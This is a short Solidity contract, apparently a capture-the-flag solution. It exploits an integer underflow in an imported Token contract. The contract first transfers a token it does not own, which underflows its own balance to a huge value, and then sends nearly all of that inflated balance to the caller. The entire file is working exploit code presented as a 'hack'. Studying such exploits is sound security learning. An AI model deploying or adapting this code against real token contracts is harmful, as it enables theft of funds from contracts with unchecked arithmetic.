// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Token.sol";

contract HackToken {

    address immutable tokenContractAddr;

    /*
    * @param _tokenContractAddr Address of the deployed Token contract instance
    */
    constructor(address _tokenContractAddr){
        tokenContractAddr = _tokenContractAddr;
    }

    /*
    * @summary Invoke this function first to cause underflow
    */
    function hack_stage1() internal {
        Token tokenContract = Token(tokenContractAddr);

        // Cause underflow for balance of this contract
        tokenContract.transfer(msg.sender, 1);
    }

    /*
    * @summary Invoke this function second to transfer yourself a large amount of tokens
    */
    function hack_stage2() internal {
        Token tokenContract = Token(tokenContractAddr);

        // Get underflown balance of this contract
        uint256 transferrableUnderflownBalance = tokenContract.balanceOf(address(this));

        // Calculate transferrable tokens
        uint256 senderBalance = tokenContract.balanceOf(msg.sender);
        uint256 transferrableBalance = transferrableUnderflownBalance - senderBalance - 1;

        // Transfer all of it to sender
        tokenContract.transfer(msg.sender, transferrableBalance);
    }

    /*
    * @summary Invoke this to do the hack
    */
    function hack() external {
        hack_stage1();
        hack_stage2();
    }
}